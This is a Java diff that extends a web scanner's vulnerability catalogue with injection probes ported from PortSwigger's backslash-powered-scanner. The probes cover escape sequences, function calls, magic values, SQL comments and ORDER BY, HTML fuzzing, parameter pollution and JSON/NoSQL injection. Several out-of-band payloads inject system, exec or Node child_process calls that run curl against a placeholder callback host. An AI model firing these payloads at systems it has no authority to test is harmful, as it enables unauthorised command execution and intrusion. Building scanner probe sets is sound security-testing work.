@@ -494,6 +494,188 @@ public final class VulnCatalog {
         fwd.add(p(Tier.NOVEL, "by=127.0.0.1;for=10.0.0.1"));
         list.add(new VulnClass("Forwarded Header Trust", "Forwarded", "ip", fwd));
 
+        // ── Backslash-Powered Scanner ports ──────────────────────────────
+        // The backslash-powered-scanner extension (https://github.com/PortSwigger/
+        // backslash-powered-scanner) works by injecting a backslash before a probe
+        // and reading the reflected bytes back: if the server drops the backslash and
+        // then decodes what follows, the value came out of a filter that is only one
+        // pass deep, which is exactly the condition an injection payload needs to
+        // reach the interpreter un-escaped. The classes below are its probe sets,
+        // placed in every injection point the shared placement engine offers.
+        //
+        // Source: src/burp/TransformationScan.java, decodeBasedPayloads/payloads.
+        // "decode-based" probes (101, x41, u0041, 0, 1, x0) are the tell for a
+        // backslash-consuming filter; the special-character set finds the quote,
+        // backtick and escape characters the string is actually delimited by.
+        List<Payload> bslash = new ArrayList<>();
+        bslash.add(p(Tier.CLASSIC, "\\101"));          // octal escape -> 'A'
+        bslash.add(p(Tier.CLASSIC, "\\x41"));          // hex escape    -> 'A'
+        bslash.add(p(Tier.CLASSIC, "\\u0041"));        // unicode       -> 'A'
+        bslash.add(p(Tier.RARE, "\\0"));               // octal NUL
+        bslash.add(p(Tier.RARE, "\\x0"));              // hex NUL
+        bslash.add(p(Tier.RARE, "\\1"));               // octal SOH
+        // The same tokens without the backslash: a difference between the two
+        // tells you whether the backslash was consumed or survived intact.
+        bslash.add(p(Tier.CLASSIC, "101"));
+        bslash.add(p(Tier.CLASSIC, "x41"));
+        bslash.add(p(Tier.CLASSIC, "u0041"));
+        bslash.add(p(Tier.RARE, "0"));
+        bslash.add(p(Tier.RARE, "1"));
+        bslash.add(p(Tier.RARE, "x0"));
+        // findReflectionIssues()'s special-character set, both with and without a
+        // leading backslash so the consuming/not-consuming branches are both probed.
+        String[] bslashChars = {
+            "'", "\"", "{", "}", "(", ")", "[", "]", "$", "`",
+            "/", "@", "#", ";", "%", "&", "|", "^", "?",
+        };
+        for (String ch : bslashChars) {
+            bslash.add(p(Tier.CLASSIC, "\\" + ch));
+            bslash.add(p(Tier.RARE, ch));
+        }
+        list.add(new VulnClass("Backslash Decode", "X-Forwarded-For", "q", bslash));
+
+        // Function-call probes, one per language/dialect the scanner tries. Each is
+        // a *valid* call that must not error, so a difference from the control
+        // responses means the call was evaluated. Source: exploreAvailableFunctions().
+        List<Payload> fnCall = new ArrayList<>();
+        fnCall.add(p(Tier.CLASSIC, "abs(1)"));                         // generic
+        fnCall.add(p(Tier.RARE, "1.abs"));                            // Ruby method
+        fnCall.add(p(Tier.RARE, "1.to_s"));                            // Ruby
+        fnCall.add(p(Tier.RARE, "unichr(49)"));                        // Python 2
+        fnCall.add(p(Tier.RARE, "int(unichr(49))"));                  // Python
+        fnCall.add(p(Tier.RARE, "isFinite(1)"));                       // JavaScript
+        fnCall.add(p(Tier.CLASSIC, "$((10/10))"));                     // POSIX shell
+        fnCall.add(p(Tier.RARE, "(getppid()**0)"));                    // Perl
+        fnCall.add(p(Tier.RARE, "pow((int)phpversion(),0)"));          // PHP
+        fnCall.add(p(Tier.RARE, "power(unix_timestamp(),0)"));        // MySQL
+        fnCall.add(p(Tier.RARE, "to_number(1)"));                      // Oracle
+        fnCall.add(p(Tier.RARE, "power(current_request_id(),0)"));     // SQL Server
+        fnCall.add(p(Tier.RARE, "power(inet_server_port(),0)"));       // PostgreSQL
+        fnCall.add(p(Tier.RARE, "min(sqlite_version(),1)"));           // SQLite
+        list.add(new VulnClass("Function Injection", "X-Forwarded-For", "f", fnCall)
+            .oob(
+                p(Tier.NOVEL, "system('curl {{OOB}}')"),
+                p(Tier.NOVEL, "exec('curl {{OOB}}')")));
+
+        // Magic values: keywords that switch an interpreter or framework into a
+        // different code path. Each real keyword is paired with the scanner's
+        // single-character-corrupted controls (position i%len replaced by 'z') so
+        // a candidate can be attributed to the keyword rather than to the mere
+        // presence of the string — 'zefined' and 'undefined' should not agree.
+        // Source: BurpExtender default for "diff: magic values", DiffingScan.
+        String[] magicValues = {
+            "undefined", "null", "empty", "none",
+            "COM1", "c!C123449477", "aA1537368460!", "help",
+        };
+        List<Payload> magic = new ArrayList<>();
+        for (String mv : magicValues) {
+            // 'help' is the scanner's own "a real word that should be unremarkable"
+            // control, so it is the least interesting of the eight.
+            magic.add(p(mv.equals("help") ? Tier.RARE : Tier.CLASSIC, mv));
+            for (int i = 0; i < 4; i++) {
+                StringBuilder corruptor = new StringBuilder(mv);
+                corruptor.setCharAt(i % mv.length(), 'z');
+                magic.add(p(Tier.NOVEL, corruptor.toString()));
+            }
+        }
+        list.add(new VulnClass("Magic Value", "X-Forwarded-For", "v", magic));
+
+        // Function hijacking: a misspelling of a real call that the framework may
+        // still resolve (loose autoloading, __call, or a regex that only anchors the
+        // prefix). Source: DiffingScan "Function hijacking".
+        List<Payload> hijack = new ArrayList<>();
+        hijack.add(p(Tier.RARE, "sprimtf"));
+        hijack.add(p(Tier.RARE, "sprintg"));
+        hijack.add(p(Tier.RARE, "exception"));
+        hijack.add(p(Tier.RARE, "malloc"));
+        hijack.add(p(Tier.NOVEL, "sprintf"));
+        list.add(new VulnClass("Function Hijacking", "X-Forwarded-For", "f", hijack));
+
+        // Escape-sequence and regex probes, only meaningful once a backslash
+        // delimiter has been identified. Source: DiffingScan escape/regex probes.
+        List<Payload> escapes = new ArrayList<>();
+        escapes.add(p(Tier.RARE, "\\u0041"));   // unicode escape
+        escapes.add(p(Tier.RARE, "\\u0042"));
+        escapes.add(p(Tier.RARE, "\\s0041"));   // regex \s class
+        escapes.add(p(Tier.RARE, "\\n0041"));   // regex \n class
+        escapes.add(p(Tier.RARE, "\\@z@"));     // regex breakout at '@'
+        escapes.add(p(Tier.RARE, "\\/z/"));     // regex breakout at '/'
+        escapes.add(p(Tier.NOVEL, "\\g0041"));  // backreference
+        list.add(new VulnClass("Escape Sequence", "X-Forwarded-For", "e", escapes));
+
+        // Comment injection: closes an open construct and comments out the rest of
+        // the statement, so an error-based payload never reaches the parser.
+        List<Payload> comment = new ArrayList<>();
+        comment.add(p(Tier.CLASSIC, "/*"));
+        comment.add(p(Tier.CLASSIC, "*/"));
+        comment.add(p(Tier.CLASSIC, "/**/"));
+        comment.add(p(Tier.CLASSIC, "--"));
+        comment.add(p(Tier.RARE, "#"));
+        comment.add(p(Tier.RARE, "/'z*/"));     // quote + comment, order-by flavour
+        comment.add(p(Tier.RARE, "/*z'/"));
+        comment.add(p(Tier.NOVEL, "/**z'*/"));
+        comment.add(p(Tier.NOVEL, "/*//z'//*/"));
+        list.add(new VulnClass("Comment Injection", "X-Forwarded-For", "c", comment));
+
+        // ORDER BY / numeric-context probes. '/0' distinguishes "the value was
+        // parsed as an expression" from "the value was compared as a string", and
+        // the function-call variants then confirm the dialect.
+        List<Payload> orderBy = new ArrayList<>();
+        orderBy.add(p(Tier.CLASSIC, "/0"));
+        orderBy.add(p(Tier.RARE, "/00"));
+        orderBy.add(p(Tier.RARE, "/000"));
+        orderBy.add(p(Tier.RARE, "/(2-2)"));     // divide by expression
+        orderBy.add(p(Tier.RARE, "/(3-3)"));
+        orderBy.add(p(Tier.CLASSIC, ",abs(1)"));
+        orderBy.add(p(Tier.RARE, ",abz(1)"));    // invalid call: control for ,abs(1)
+        orderBy.add(p(Tier.RARE, ",abs(0,1)"));
+        orderBy.add(p(Tier.RARE, " procedure analyse (0,0,0)-- -"));
+        orderBy.add(p(Tier.RARE, " procedure analyze (0,0)-- -"));
+        orderBy.add(p(Tier.NOVEL, " procedure analyse (0,0,0)-- -z"));
+        list.add(new VulnClass("Order By Injection", "X-Forwarded-For", "o", orderBy));
+
+        // HTML tag / comment stripping, used by the scanner to tell a WAF that
+        // rewrites markup from an application that only compares markup.
+        List<Payload> htmlStrip = new ArrayList<>();
+        htmlStrip.add(p(Tier.CLASSIC, ">zz<"));
+        htmlStrip.add(p(Tier.CLASSIC, "z>z<z"));
+        htmlStrip.add(p(Tier.CLASSIC, "z>><z"));
+        htmlStrip.add(p(Tier.RARE, "<zz>"));
+        htmlStrip.add(p(Tier.RARE, "<!--zz-->"));
+        htmlStrip.add(p(Tier.RARE, "<--zz-->"));
+        htmlStrip.add(p(Tier.RARE, "<!--zz->"));
+        htmlStrip.add(p(Tier.NOVEL, "<!-->z<-->"));
+        list.add(new VulnClass("HTML Tag Fuzzing", "X-Forwarded-For", "h", htmlStrip));
+
+        // Server-side HTTP parameter pollution: append a second parameter with the
+        // same name but a different operator, so a front end that keeps the first
+        // and an origin that keeps the last disagree about the value entirely.
+        // Source: DiffingScan "Backend Parameter Injection".
+        List<Payload> hpp = new ArrayList<>();
+        hpp.add(p(Tier.CLASSIC, "&zq=%3c%61%60%27%22%24%7b%7b%5c"));
+        hpp.add(p(Tier.CLASSIC, "|zqy=x%3c%61%60%27%22%24%7b%7b%5c"));
+        hpp.add(p(Tier.RARE, "!zq=%3c%61%60%27%22%24%7b%7b%5c"));
+        hpp.add(p(Tier.RARE, "%26zqy=%3c%61%60%27%22%24%7b%7b%5c"));
+        hpp.add(p(Tier.RARE, "%26zq=x%3c%61%60%27%22%24%7b%7b%5c"));
+        hpp.add(p(Tier.NOVEL, ";zq=%3c%61%60%27%22%24%7b%7b%5c"));
+        list.add(new VulnClass("HPP Injection", "X-Forwarded-For", "zq", hpp));
+
+        // JSON delimiter injection. A value spliced in with the wrong delimiter
+        // (',' vs ':' vs ';' vs '.') either adds a key, changes a type, or — in a
+        // lenient parser — injects a whole new object.
+        List<Payload> jsonDelim = new ArrayList<>();
+        jsonDelim.add(p(Tier.CLASSIC, ",\"z\":0"));
+        jsonDelim.add(p(Tier.CLASSIC, ",\"z\":{\"z\":0}"));
+        jsonDelim.add(p(Tier.RARE, ",\"z\";0"));
+        jsonDelim.add(p(Tier.RARE, ",\"z\".0"));
+        jsonDelim.add(p(Tier.RARE, ":{\"$gt\":\"\"}"));
+        jsonDelim.add(p(Tier.RARE, ":{\"$ne\":\"z\"}"));
+        jsonDelim.add(p(Tier.NOVEL, ",\"$where\":\"this.z==this.z\""));
+        list.add(new VulnClass("JSON Injection", "X-Forwarded-For", "z", jsonDelim)
+            .oob(
+                p(Tier.NOVEL,
+                    ":{\"$where\":\"function(){require('child_process').exec('curl {{OOB}}');return true;}\"}")));
+
         return Collections.unmodifiableList(list);
     }
 
@@ -552,6 +734,28 @@ public final class VulnCatalog {
             case "QAPP": return "QueryApp";
             case "UA": return "UserAgent+";
             default: return kind;
+        }
+    }
+
+    /** Maps a placement kind to the request surface a payload dropped there lands on. */
+    public static Technique.Position positionForPlacement(String kind) {
+        if (kind == null) return null;
+        switch (kind) {
+            // Header Append and User-Agent both write into the header block.
+            case "HDR":
+            case "UA":
+                return Technique.Position.HEADER;
+            // Every other placement rewrites the request-target, whether it is a
+            // path segment, the whole path, or a query value.
+            case "SEG+":
+            case "SEG-":
+            case "ROOT-P":
+            case "ROOT-Q":
+            case "QREP":
+            case "QAPP":
+                return Technique.Position.URL;
+            default:
+                return null;
         }
     }
 
